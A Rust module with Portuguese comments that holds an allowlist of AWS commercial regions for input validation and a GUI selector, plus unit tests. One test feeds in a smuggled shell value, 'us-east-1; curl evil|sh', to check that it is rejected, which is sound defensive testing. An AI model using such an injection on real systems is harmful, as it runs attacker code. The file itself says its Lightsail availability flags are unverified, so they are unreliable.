//! Lista fechada de regiões aceitas. Serve de validação (só estas passam, inclusive para o
//! script remoto da EC2) e de fonte para o seletor de região da interface.
//!
//! Só a partição comercial `aws`. Regiões GovCloud e China ficam de fora de propósito (contas
//! e endpoints separados). Regiões novas da AWS precisam ser acrescentadas aqui.

use serde::Serialize;

#[derive(Debug, Clone, Copy, Serialize)]
pub struct RegionInfo {
    pub code: &'static str,
    pub name: &'static str,
    /// Lightsail Containers disponível. Lista montada de memória e NÃO verificada na AWS:
    /// serve só para filtrar o seletor da GUI, nunca para bloquear um deploy.
    pub lightsail: bool,
}

const fn r(code: &'static str, name: &'static str, lightsail: bool) -> RegionInfo {
    RegionInfo { code, name, lightsail }
}

pub const REGIONS: &[RegionInfo] = &[
    r("us-east-1", "N. Virginia", true),
    r("us-east-2", "Ohio", true),
    r("us-west-1", "N. California", false),
    r("us-west-2", "Oregon", true),
    r("ca-central-1", "Canadá (Central)", true),
    r("ca-west-1", "Calgary", false),
    r("eu-west-1", "Irlanda", true),
    r("eu-west-2", "Londres", true),
    r("eu-west-3", "Paris", true),
    r("eu-central-1", "Frankfurt", true),
    r("eu-central-2", "Zurique", false),
    r("eu-north-1", "Estocolmo", true),
    r("eu-south-1", "Milão", false),
    r("eu-south-2", "Espanha", false),
    r("ap-south-1", "Mumbai", true),
    r("ap-south-2", "Hyderabad", false),
    r("ap-southeast-1", "Singapura", true),
    r("ap-southeast-2", "Sydney", true),
    r("ap-southeast-3", "Jacarta", false),
    r("ap-southeast-4", "Melbourne", false),
    r("ap-southeast-5", "Malásia", false),
    r("ap-northeast-1", "Tóquio", true),
    r("ap-northeast-2", "Seul", true),
    r("ap-northeast-3", "Osaka", false),
    r("ap-east-1", "Hong Kong", false),
    r("sa-east-1", "São Paulo", false),
    r("me-south-1", "Bahrein", false),
    r("me-central-1", "Emirados Árabes", false),
    r("il-central-1", "Tel Aviv", false),
    r("af-south-1", "Cidade do Cabo", false),
];

pub fn is_known(code: &str) -> bool {
    REGIONS.iter().any(|r| r.code == code)
}

pub fn find(code: &str) -> Option<&'static RegionInfo> {
    REGIONS.iter().find(|r| r.code == code)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn codes_are_unique_and_well_formed() {
        for (i, a) in REGIONS.iter().enumerate() {
            assert!(
                !a.code.is_empty()
                    && a.code
                        .chars()
                        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-'),
                "{}",
                a.code
            );
            assert!(
                REGIONS[i + 1..].iter().all(|b| b.code != a.code),
                "duplicada: {}",
                a.code
            );
        }
    }

    #[test]
    fn only_listed_regions_are_known() {
        assert!(is_known("us-east-2"));
        assert!(!is_known("us-gov-west-1"));
        assert!(!is_known("us-east-1; curl evil|sh"));
        assert!(!is_known(""));
    }
}
